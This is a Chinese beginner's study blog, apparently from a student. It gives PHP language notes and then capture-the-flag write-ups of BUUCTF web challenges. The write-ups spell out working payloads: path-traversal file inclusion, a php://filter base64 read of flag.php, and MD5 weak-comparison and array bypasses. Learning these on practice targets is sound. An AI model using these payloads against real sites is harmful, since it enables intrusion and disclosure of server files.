        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="一、PHP开发入门"><a href="#一、PHP开发入门" class="headerlink" title="一、PHP开发入门"></a>一、PHP开发入门</h1><h2 id="1-PHP概述"><a href="#1-PHP概述" class="headerlink" title="1.PHP概述"></a>1.PHP概述</h2><p>PHP最初是由 Rasmus Lerdorf于1994年为了维护个人网页而编写的一个简单程序。这个程序用来显示Rasmus Lerdorf的个人履历以及统计网页流量，因此最初称为个人主页(Personal Home Page)。后来受到GNU的影响，它更名为PHP(Hypertext Preprocessor，超文本预处理器）。</p><p>PHP作为服务器端Web程序开发语言，主要有以下两方面原因：</p><p>1.PHP是一种服务器端、HTML嵌入式的脚本语言，因此适合Web开发。</p><p>2.PHP是B&#x2F;S(Browser&#x2F;Server，浏览器&#x2F;服务器)架构，即服务器启动后，用户可以不使用客户端软件，而是使用浏览器进行访问，这种方式既保持了图形化的用户界面，又大大减少了应用程序的维护量。</p><p>PHP的应用领域：</p><p>全球有60% 的网站都在使用PHP技术进行开发，包括Facebook、谷歌、百度、新浪等国内外一线互联网公司。PHP正吸引着越来越多的Web开发人员，其应用领域非常广泛，如网站开发、OA办公系统、电子商务、CRM管理系统、ERP系统、手机APP接口及API接口、网页游戏后台、服务器脚本等。</p><h2 id="2-PHP开发环境搭建"><a href="#2-PHP开发环境搭建" class="headerlink" title="2.PHP开发环境搭建"></a>2.PHP开发环境搭建</h2><p>下载WampServer</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732718696824-9b37b96c-6344-4024-a578-838f91661ba2.png"></p><p>安装WampServer</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732718730481-9bb1d09e-4c40-42d6-87fe-6a32147fa363.png"></p><p>打开WampServer</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732718730781-d1bad042-852d-43d9-8068-32f281cadc80.png"></p><p>成功编写第一个php程序！！！！！！</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732789008735-00ccaea5-d250-4b62-80ab-06b56b9fcf3d.png"></p><h1 id="二、PHP编程基础"><a href="#二、PHP编程基础" class="headerlink" title="二、PHP编程基础"></a>二、PHP编程基础</h1><h2 id="1-PHP基础知识"><a href="#1-PHP基础知识" class="headerlink" title="1.PHP基础知识"></a>1.PHP基础知识</h2><p>PHP的一些知识与语言相同，相同的部分不多赘述</p><p>php标记：开始要用一对标记将PHP代码包含起来，以便和HTML代码区分。\</p><p>一般用<?php和?>来分别作为开始结束标记</p><p>注释：可以使用c语言风格</p><p>标识符和关键字如下图：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/50616406/1732721072654-f2ce19d0-49bf-4bae-8695-bbe5ef5c3657.jpeg"></p><p>PHP变量及数据类型：在PHP中，变量是由$和变量名构成的，命名规则与标识符相同，且区分大小写。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/50616406/1732721922313-bf54784a-3e48-4a98-8419-2f37fa5f0cdf.jpeg"></p><p>boolean（布尔型)：该类型只能为true（真）和false（假）且不区分大小写。</p><p>例：$bool &#x3D; true;将true值赋给$bool</p><p>integer型（整型）：存储整数</p><p>float（浮点型）：存储实数</p><p>string（字符串型）：字符串可以由单引号（单引号的这种形式只能转义单引号(&#39;)和反斜杠(\)。）、双引号 （可以转移一些字符，也可以解析变量）、定界符（&lt;&lt;&lt;）（在之后用一个标识符表示开始，然后是包含的字符串，最后是同样的标识符结束字符串，并且后面除了分号不能有任何其他字符）</p><p>PHP检测数据类型：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/50616406/1732722851738-5112a28f-b4f4-4e02-b5ce-1781c58ea4a5.jpeg"></p><p>函数返回的布尔值true转换成字符串“1”，false转换成空字符串</p><p>PHP常见转义字符：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/50616406/1732722034101-b561fa9d-95a3-454a-8923-c0816235e328.jpeg"><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/50616406/1732722037706-dfcfcd45-6f30-44a5-a313-d50f1f3c0b5d.jpeg"></p><p><br>：表示换行</p><p>PHP常量：指在程序执行过程中值不变的量，通过函数define()来定义</p><p>预定义常量：<img src="https://cdn.nlark.com/yuque/0/2024/jpeg/50616406/1732723268009-1b9cf437-5078-4a20-86e9-1d71a5516208.jpeg"></p><p>数据类型转换：</p><p>其他类型转换成布尔型：整型0、浮点型0.0、字符串型””与”0”、不包含任何元素的数组、不包含任何成员变量的对象、NULL会被转换成false，其他值会被转化成true。</p><p>布尔型转化成整型：true转化成1，false转化成0</p><p>字符串类型转化成整型或浮点型：如果字符串是数字序列的字符，则这转换成该数字，否则出现警告</p><p>布尔型转化成字符串类型：true转换成”1”，false转换成””。</p><p>整型或浮点型转换成字符串类型：字面样式转换</p><p>PHP一些基本运算符参考c语言</p><p>&#x3D;&#x3D;与&#x3D;&#x3D;&#x3D;的区别是&#x3D;&#x3D;先将操作数转换成相同类型在进行比较，两者值相同则返回true，而&#x3D;&#x3D;&#x3D;只有值相等并且数据类型相同才返回true</p><p>NULL合并运算符：表达式1 ?? 表达式2 ;  意为表达式1的值存在且不为NULL则返回该值，否则返回表达式2的值</p><p>组合比较运算符：表达式1 &lt;&#x3D;&gt; 表达式2;  意为当表达式1小于等于大于表达式2时分别返回-1、0、1</p><p>位运算符：<img src="https://cdn.nlark.com/yuque/0/2024/jpeg/50616406/1732790878199-e18af6e7-321b-4481-88c7-c5d321f4b348.jpeg"></p><p>其他运算符：<img src="https://cdn.nlark.com/yuque/0/2024/jpeg/50616406/1732790934912-1187285f-a65b-4e21-a98e-4d49297ac9a7.jpeg"></p><p>运算符的优先级：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/50616406/1732790995249-f956ed3a-43e6-47f4-aa16-961aa9cde519.jpeg"></p><p>选择语句，循环语句、跳转语句基本与c语言相通，在此不多赘述了</p><p>写了一道题：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/50616406/1732867587894-7e31367c-cef1-4ddd-8df2-8e59afea4dde.jpeg"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1733042498129-7e39fc05-025d-4d88-afa4-7402f3796e0d.png"></p><h2 id="2-PHP函数、数组"><a href="#2-PHP函数、数组" class="headerlink" title="2.PHP函数、数组"></a>2.PHP函数、数组</h2><p>PHP的函数的定义：</p><p><em>function 函数名（参数名1 [&#x3D;值1],参数名2 [&#x3D;值2],参数名3 [&#x3D;值3],……)</em></p><p><em>{</em></p><p><em>函数体</em></p><p><em>[return 返回值；]</em></p><p><em>};</em></p><p>[]中的内容可以省略。并且在书写时不带[]</p><p><em>函数的调用：</em></p><p><em>function 函数名（参数名1 [&#x3D;值1],参数名2 [&#x3D;值2],参数名3 [&#x3D;值3],……)</em></p><p>常用函数：</p><p><strong><font style="color:rgb(51, 51, 51);">urlencode() 函数：</font></strong><font style="color:rgb(51, 51, 51);">urlencode() 函数编码URL 字符串函数，</font><font style="color:rgb(51, 51, 51);">此函数便于将字符串编码并将其用于 URL 的请求部分，同时它还便于将变量传递给下一页。</font></p><p><font style="color:rgb(51, 51, 51);">语法：</font><em><font style="color:rgb(51, 51, 51);">string urlencode ( string $str );</font></em></p><p><font style="color:rgb(51, 51, 51);">此函数便于将字符串编码并将其用于 URL 的请求部分，同时它还便于将变量传递给下一页。编码 URL 字符串函数。</font></p><p><font style="color:rgb(51, 51, 51);">此函数便于将字符串编码并将其用于 URL 的请求部分，同时它还便于将变量传递给下一页。</font></p><p><strong><font style="color:rgb(51, 51, 51);">serialize() 函数：</font></strong><font style="color:rgb(51, 51, 51);">用于序列化对象或数组，并返回一个字符串。函数序列化对象后，可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。</font></p><p><font style="color:rgb(51, 51, 51);">语法：string serialize ( mixed $value );</font></p><p><strong>__wakeup()函数：</strong>__wakeup() 是 PHP 中一个特殊的魔术方法。它在反序列化一个对象时被自动调用，允许开发者在对象从序列化格式还原为可用的 PHP 对象之前对其进行某些特殊处理。这个方法可以接受任意的参数，但在实际使用中，它通常不需要参数。</p><p><strong><font style="color:rgb(51, 51, 51);">eval() 函数：</font></strong><font style="color:rgb(51, 51, 51);">eval() 函数把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，且必须以分号结尾。</font></p><p><font style="color:rgb(51, 51, 51);">语法：</font><font style="color:rgb(68, 68, 68);">eval(</font><em><font style="color:rgb(68, 68, 68);">phpcode</font></em><font style="color:rgb(68, 68, 68);">);</font></p><p><strong><font style="color:rgb(51, 51, 51);">include ()和 require()函数</font></strong><font style="color:rgb(51, 51, 51);">：在 PHP 中，可以在服务器执行 PHP 文件之前在该文件中插入一个文件的内容。include 和 require 语句用于在执行流中插入写在其他文件中的有用的代码。include 和 require 除了处理错误的方式不同之外，在其他方面都是相同的：require 生成一个致命错误（E_COMPILE_ERROR），在错误发生后脚本会停止执行。include 生成一个警告（E_WARNING），在错误发生后脚本会继续执行。</font></p><p><font style="color:rgb(17, 17, 17);">语法：include ‘filename’;    或者   </font><em><font style="color:rgb(17, 17, 17);"> require ‘filename’;</font></em></p><p><strong><font style="color:rgb(77, 77, 77);">mb_substr()函数：</font></strong><font style="color:rgb(51, 51, 51);">mb_substr() 函数返回字符串的一部分，substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用 mb_substr()。如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。</font></p><p><font style="color:rgb(51, 51, 51);">语法：mb_substr( string $str , int $start [, int $length &#x3D; NULL [, string $encoding &#x3D; mb_internal_encoding() ]] )</font><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1733042975644-854a4512-2bf5-4165-9ce5-cf624f54b92f.png"></p><p><strong><font style="color:rgb(77, 77, 77);">mb_strpos()函数：</font></strong><font style="color:rgb(17, 17, 17);"> — 查找字符串在另一个字符串中首次出现的位置 查找 string 在一个 string 中首次出现的位置。 基于字符数执行一个多字节安全的 strpos () 操作。 第一个字符的位置是 0，第二个字符的位置是 1，以此类推。 要被检查的 string。 在 haystack 中查找这个字符串。 和 strpos () 不同的是，数字的值不会被当做字符的顺序值。</font></p><p><font style="color:rgb(77, 77, 77);">语法：mb_strpos (haystack ,needle );</font></p><p><font style="color:rgb(77, 77, 77);">参数：haystack：要被检查的字符串。needle：要搜索的字符串。</font></p><p><strong><font style="color:rgb(77, 77, 77);">urldecode()函数：</font></strong><font style="color:rgb(17, 17, 17);">urldecode() 方法用于解码 PHP 中的编码字符串。urldecode() 是 PHP 中用于解码编码字符串和 URL 的内置方法。 urldecode() 只能解码由 urlencode() 方法完成的编码字符串和 URL。 此方法的语法是： 其中 URL 是要解码的 URL 或字符串，此方法的返回值是一个字符串</font></p><p><font style="color:rgb(51, 51, 51);">语法：string urldecode ( string $str );</font></p><p><strong>strcmp()函数：</strong><font style="color:rgb(51, 51, 51);">函数用于比较两个字符串（区分大小写）。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</font></p><p><font style="color:rgb(63, 63, 63);background-color:rgb(253, 252, 248);">语法：</font>strcmp(string1,stri<font style="color:rgb(51, 51, 51);">strcmp()</font></p><p><strong>file_get_contents()函数：</strong><font style="color:rgb(77, 77, 77);">在PHP中，</font>file_get_contents<font style="color:rgb(77, 77, 77);">() </font>函数<font style="color:rgb(77, 77, 77);">是一个强大的工具，它既可以用于读取本</font>地文件的内容，也可以用于发起 HTTP 请求获取远程资源。</p><p>语法：file_get_contents(path,include_path,context,start,max_length);<img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1733043792480-c6f50939-046d-438d-aefa-3f39aeefdea4.png"></p><p><strong><font style="color:rgb(51, 51, 51);">preg_match()函数：</font></strong><font style="color:rgb(51, 51, 51);"> preg_match函数用于执行一个正则表达式匹配。</font></p><p><font style="color:rgb(51, 51, 51);">语法：</font><em><font style="color:rgb(51, 51, 51);">int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags &#x3D; 0 [, int $offset &#x3D; 0 ]]] )</font></em></p><p><font style="color:rgb(51, 51, 51);">参数说明：</font></p><p><font style="color:rgb(51, 51, 51);">$pattern: 要搜索的模式，字符串形式。</font></p><p><font style="color:rgb(51, 51, 51);">$subject: 输入字符串。</font></p><p><font style="color:rgb(51, 51, 51);">$matches: 如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。</font></p><p><font style="color:rgb(51, 51, 51);">$flags：flags 可以被设置为以下标记值：</font></p><p><font style="color:rgb(51, 51, 51);">PREG_OFFSET_CAPTURE: 如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量(相对于目标字符串的)。 注意：这会改变填充到matches参数的数组，使其每个元素成为一个由 第0个元素是匹配到的字符串，第1个元素是该匹配字符串 在目标字符串subject中的偏移量。</font></p><p><font style="color:rgb(51, 51, 51);">offset: 通常，搜索从目标字符串的开始位置开始。可选参数 offset 用于 指定从目标字符串的某个未知开始搜索(单位是字节)。</font></p><p><font style="color:rgb(51, 51, 51);"></font></p><p>数组的定义：</p><p>1.直接为数组赋值：_$数组名[key]&#x3D; value ; _</p><p>2.使用array语句定义数组：<em>$数组名 &#x3D; array(key1 &#x3D;&gt; value1 , key2 &#x3D;&gt; value2 ,……);</em></p><p>数组的操作：</p><p>输出：var_dump()函数可以输出数组中的每个元素与值的数据类型，print_r()函数可以直接输出数组中的所有元素</p><p>删除：用unset语句可以删除整个数组，也可以删除数组中的某一个元素。用法为：unset(数组名);</p><p>运算：<img src="https://cdn.nlark.com/yuque/0/2024/jpeg/50616406/1732978528950-a7cae304-4d6f-4632-82c7-716d3a89ec27.jpeg"><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/50616406/1732978533698-ae49f329-8d2b-44ed-a848-c74ba945a8d9.jpeg"></p><p>数组遍历：</p><p>用foreach语句遍历数组：</p><p><em>foreach($数组名 as [$key &#x3D;&gt;] $value){   循环体   };</em></p><p>举例：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732979393040-4bd37911-15a5-49f4-9ec2-42bfd88f6f04.png"></p><p>数组的常用语句、函数：</p><p><strong>1.list语句：</strong><font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);">把数组中的值赋给一些变量。</font></p><p><font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);">语法：</font>_ list(var1,var2…);_</p><p><strong>2.each()函数：</strong><font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);">返回当前元素的键名和键值，并将内部指针向前移动，该元素的键名和键值会被返回带有四个元素的数组中。两个元素（1 和 Value）包含键值，两个元素（0 和 Key）包含键名。</font></p><p><font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);">语法：</font><em><font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);"> each(array);</font></em></p><p>**3.count()函数：**该函数可以统计数组中元素的个数</p><p>语法：_int count(array,mode);         _</p><p>mode为可选参数<font style="color:rgb(0, 0, 0);">可选。规定模式。可能的值：</font></p><p><font style="color:rgb(0, 0, 0);">0 - 默认。不对多维数组中的所有元素进行计数</font></p><p><font style="color:rgb(0, 0, 0);">1 - 递归地计数数组中元素的数目（计算多维数组中的所有元素）</font></p><p><strong><font style="color:rgb(0, 0, 0);">4.压入、弹出元素函数：</font></strong><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/50616406/1732980994939-8724b26b-5fbb-45d6-a93f-d44cf07c1466.jpeg"></p><p><strong>5.移除重复值：</strong><font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);">array_unique() 函数移除数组中的重复的值，并返回结果数组。当几个数组元素的值相等时，只保留第一个元素，其他的元素被删除。返回的数组中键名不变。</font></p><p><font style="color:rgb(63, 63, 63);background-color:rgb(253, 252, 248);">语法：</font><em><font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);">array_unique(array);</font></em></p><p><font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);"></font></p><p><font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);">二维数组：</font></p><p><font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);">定义：</font></p><p><em><font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);">array (</font></em></p><p><em><font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);">    array (elements…),</font></em></p><p><em><font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);">    array (elements…),</font></em></p><p><em><font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);">    …</font></em></p><p><em><font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);">)</font></em></p><p><font style="color:rgb(0, 0, 0);background-color:rgb(253, 252, 248);">二维数组的遍历可以通过foreach语句嵌套来遍历二维数组</font></p><h1 id="三、练习（BUUCTF"><a href="#三、练习（BUUCTF" class="headerlink" title="三、练习（BUUCTF)"></a><font style="color:#000000;">三、练习（</font><a href="https://buuoj.cn/"><font style="color:#000000;">BUUCTF</font></a><font style="color:#000000;">)</font></h1><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732896037818-c8f3e200-efc1-4294-9419-1624bc9d691c.png"></p><h2 id="1-极客大挑战-2019-Havefun"><a href="#1-极客大挑战-2019-Havefun" class="headerlink" title="1.[极客大挑战 2019]Havefun"></a>1.<font style="color:rgb(33, 37, 41);">[极客大挑战 2019]Havefun</font></h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732896036892-cebc68d7-8b8a-4a78-af84-7f3330417ef5.png"></p><p>进入这一题看到了一只很可爱的猫猫，<del>如果我不是来做题的话，我会看上一整天，傻笑一整天……</del></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732896036764-231e32a0-03ce-4478-887a-a167b22bf327.png"></p><p>这道题页面上啥都没有，就想着看看源代码，进一步发掘有效信息</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732896038228-24b55826-ab57-4e88-bede-8a6e19d2b065.png"></p><p>打开之后是一堆晦涩难懂的内容，这代码确实不想看，感觉都是无效信息</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732896133010-0f76a182-8e5b-4642-be0a-8f0f6a6ed6b1.png"></p><p>还好我比较谨慎，耐心翻源代码，在页面最下面找到了绿油油的被注释掉的东西，这应该就是关键信息了，这是一段PHP代码，这段代码的意思是用get传参cat到变量…$cat里，输出变量$cat的值，之后是if语句，如果$cat里的值等于dog，那么就输出Syc{cat_cat_cat_cat}，大概率是flag。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732896037726-faf3fc09-25b1-4250-a4d6-052e431afe24.png"></p><p>所以我们在后面get请求去传参dog给cat变量，满足if语句的条件，flag就出现了。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732896037788-4166aac8-a18a-478d-95d1-f63dac382f9b.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732896036732-fecc93c1-6269-4c1e-9f2f-f8817f0267a4.png"></p><p>这道题挺适合我这样的小白的，也是做完BaseCTF2024新生赛后自己独立做出来的题目，为自己鼓掌</p><h2 id="2-HCTF-2018-WarmUp"><a href="#2-HCTF-2018-WarmUp" class="headerlink" title="2.[HCTF 2018]WarmUp"></a>2.<font style="color:rgb(33, 37, 41);">[HCTF 2018]WarmUp</font></h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732898677758-aaaab5dc-4888-4bed-8c7f-c97a9693cfa2.png"></p><p>进入页面后这一个滑稽属实绷不住，大晚上的<img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732898723717-1999bff3-befa-420e-8a5a-1e6e31239600.png">，属实绷不住</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732898678058-7e3e05ee-b197-4f11-8fef-24da185f700b.png"></p><p>还是和上一题一样，这个页面没有有效信息，所以我看看源代码，又是这一个绿油油的注释，提示已经很明显了</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732898835734-fdde5a71-e710-4c26-8a59-ecf015751f61.png"></p><p>果然，在后面加上&#x2F;source.php访问一下果然出现PHP代码了。这串代码看的我比较蒙，我简单理解一下：这段PHP代码先是用class定义emmm的类，之后定义函数checkFile，之后进行If语句，<font style="color:rgb(77, 77, 77);">i</font><font style="color:#000000;">f条件语句是关键，即需要满足</font><font style="color:#000000;">if(true &amp;&amp; true &amp;&amp; true)</font><font style="color:#000000;">，才会执行include函数，否则输出：</font><a href="https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg">https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg</a>，即<font style="color:#000000;">滑稽图。</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732898977644-6b182ff1-8064-4f16-bf22-67fc0fd17234.png"></p><p>满足后面的<font style="color:#000000;">if(true &amp;&amp; true &amp;&amp; true)前两个true比较简单，但是最后的true得看</font>这个checkFile函数，这 函数确实难懂，但是我找到了<font style="color:#000000;">hint.php，这个应该也是关键信息，访问一下后出现了这个，说明flag藏在</font><font style="color:rgb(0, 0, 0);">fffllllaaaagggg里，</font><del><font style="color:rgb(0, 0, 0);">这道题确实抽象的像极了我的室友，</font></del><font style="color:rgb(77, 77, 77);">我们始终是在source.php页面下进行操作，目的是利用最后的include函数将flag文件包含出来，从而得到答案</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732950610972-d7e9421b-80d4-48e6-a727-c1649b91e027.png"></p><p><font style="color:rgb(77, 77, 77);">接着分析一下传入</font>hint.php之后出现”<font style="color:rgb(0, 0, 0);">flag not here, and flag in ffffllllaaaagggg</font>“,PHP代码是怎么工作的：</p><p>这个题目是用class定义了一个名为emmm的类，在该类中有一个静态方法的checkFile用于检查要包含的文件是否在白名单($whitelist)中，白名单是一个关联数组$whitelist。在代码中，白名单允许包含的文件有”source”&#x3D;&gt;”source.php”和”hint”&#x3D;&gt;”hint.php”。                </p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732975579511-1cdcc036-907a-4054-8898-7a6200ff6c19.png"></p><p>第一个if语句：当传入hint.php时进行第一个if语句判断，显然hint.php是字符串，不执行<font style="color:rgb(77, 77, 77);">输出”you can’t see it”并返回false。</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732975608173-9563f50a-eadb-4bc1-8bf6-3061f18c176a.png"></p><p><font style="color:rgb(77, 77, 77);">第二个if语句：之后第二个if语句</font>检查hint.php是否在白名单内，显然它在白名单内，条件通过，继续执行后面的代码。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732975619636-08e505de-3d22-497f-804f-9e4864a7aaa2.png"></p><p>之后<font style="color:rgb(77, 77, 77);">对hint.php执行mb_substr函数，但是函数内一个参数是来自另一个函数mb_strpos的返回值，因此我们先看mb_strpos函数，使用.进行字符连接，即连接了一个问号字符 ‘?’，得到hint.php?在这个新的字符串中查找问号是否存在，那么很明显肯定能找到。那么返回值是”?”</font><font style="color:rgb(50, 50, 50);">首次出现位置的数值，</font><font style="color:rgb(77, 77, 77);">0开始算，</font><font style="color:rgb(50, 50, 50);">即8，所以</font><font style="color:rgb(77, 77, 77);">mb_substr函数的处理是返回从</font>hint.php？的第0个字符到第8个字符，其实还是返回hint.php。<del>来回绕是吧!!!原样进去原样出来，这一步真是字如其名</del><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732898678058-7e3e05ee-b197-4f11-8fef-24da185f700b.png"><del>666</del></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732975660428-90bc7fb1-0b6f-42f8-94b3-afef82136b6d.png"></p><p><font style="color:rgb(77, 77, 77);">第三个if语句：</font>之后进行第三个if语句，显然hint.php还在白名单中，<font style="color:rgb(77, 77, 77);">继续执行后面的代码</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732975684050-22d6938f-7c12-4cda-b45e-e79c2ad9c7e5.png"></p><p><font style="color:rgb(77, 77, 77);">第四个if语句(包含语句前的内容)：将$_page进行URL解码之后重复之前的</font><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732898678058-7e3e05ee-b197-4f11-8fef-24da185f700b.png"><font style="color:rgb(77, 77, 77);">处理步骤，如果$_page在白名单中存在，返回true。</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732975699767-31dce89b-06c4-4a2a-b4c6-ac897f5e0678.png"></p><p><font style="color:rgb(77, 77, 77);">如果上述条件都不满足，则输出”you can’t see it”并返回false。</font></p><p><font style="color:rgb(77, 77, 77);">这就是函数的分析，我们只需要传入一个在白名单内的文件名（source.php或者hint.php），并添加上问号，这样可以保证每次找去用于检查的内容都在白名单，返回true。</font></p><p><font style="color:rgb(77, 77, 77);">并且我们当前的source.php一般是在html目录下，往上是www，var，然后到根目录，flag一般就放在根目录下面，这里还有一个hint.php?&#x2F;或者source.php?&#x2F;，因此需要返回四层才能到根目录并且</font><font style="color:rgb(48, 48, 48);">flag 是在 ffffllllaaaagggg 里的，</font><font style="color:rgb(77, 77, 77);">所以构造source.php?file&#x3D;hint.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg即可得到falg</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732953869865-a7711c0e-141a-43a7-8fb3-bc7acafb3131.png"></p><h2 id="3-ACTF2020-新生赛-Include"><a href="#3-ACTF2020-新生赛-Include" class="headerlink" title="3.[ACTF2020 新生赛]Include"></a>3.<font style="color:rgb(33, 37, 41);">[ACTF2020 新生赛]Include</font></h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732954378529-15cecd79-06e6-45fa-b088-a9f4a5f61908.png"></p><p>看到这个题目，它给了tips，点开之后反问我<font style="color:rgb(0, 0, 0);">Can you find out the flag?</font><del><font style="color:rgb(0, 0, 0);">卧艹，这能忍？来吧我已经迫不及待了!!!</font></del></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732954378393-d92752a3-6ab0-4c53-a82f-6527e6f644a7.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732954378381-cbbb2e5e-91db-4655-961a-ac023ddb980c.png"></p><p>和前面的思路一样，这个页面没有给任何有用的信息，所以看一下源代码，也没有什么有用的信息<img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732954618823-f6824cfe-5d80-4d10-aea7-6342ec9eca7d.png"></p><p>正当我举足无措时，看了一下题目<font style="color:rgb(33, 37, 41);">[ACTF2020 新生赛]Include，include！！！</font>想到了以前写的笔记，flag大概率是被注释掉了，这里可能是要用到伪协议来显示注释的内容。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732955546382-5758b167-71ae-410c-9e26-bd845e693aba.png"></p><p>所以把file后面的内容换成php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732956320196-a5bd1f1d-78f2-48d1-b5a4-4b1cb8639bc0.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732956271439-7d27d647-54aa-4561-9485-530f8a04f83e.png"></p><p>execute一下，出现一下内容，这显然这就是base64编码内容</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732956271430-e5b0384c-269f-489c-9c62-13fcbc568fbf.png"></p><p>解码之后就发现flag就是被注释掉了，拿falg提交完事</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732956506431-8c7fb8c7-6a3a-4ba3-bbac-2a313d361ba4.png"></p><h2 id="4-NewStarCTF-2023-公开赛道-Begin-of-PHP"><a href="#4-NewStarCTF-2023-公开赛道-Begin-of-PHP" class="headerlink" title="4.[NewStarCTF 2023 公开赛道]Begin of PHP"></a>4.<font style="color:rgb(33, 37, 41);">[NewStarCTF 2023 公开赛道]Begin of PHP</font></h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732957803293-d267215c-eeab-4043-bdba-3378a4953619.png"></p><p>进入到题目里发现这里有一堆PHP代码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732957849754-f870cb4e-0856-4111-8f85-9cea058c8af4.png"></p><p>分析代码：绕过<font style="color:rgb(0, 0, 0);">&#x3D;Level 1&#x3D;到&#x3D;Level 5&#x3D;就可输出flag，所以接下来就是绕过</font></p><p>显然<font style="color:rgb(0, 0, 0);">&#x3D;Level 1&#x3D;</font>是md5绕过，之前的笔记有用啦！key1和key2原来的值不强等于而经过md5加密后的值弱相等，之后把$flag1赋值True，这里也可用数组绕过。<img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732974442735-dfbe3275-d473-44d9-8d60-ec33fbe9b690.png"></p><p>所以参照上次写的笔记输入?key1&#x3D;QNKCDZO&amp;key2&#x3D;240610708可得如下图所示的内容，说明绕过成功了，笔记是有用的，为自己鼓掌！！！</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732958829203-93227f1e-db5e-4ec0-af2f-321c10b540e6.png"></p><p>对于<font style="color:rgb(0, 0, 0);">&#x3D;Level 2&#x3D;，我们需要POST传参key3，出现了要md5密和sha1加密的内容强比较绕过，查了资料</font><font style="color:rgb(34, 34, 34);">sha1()函数和</font>md5<font style="color:rgb(34, 34, 34);">一样，都无法处理数组，如果传入的为数组，会返回NULL，所以就</font><font style="color:rgb(0, 0, 0);">数组绕过呗，试了试，就出现了以下内容，还真成功了，不愧是我。</font><img 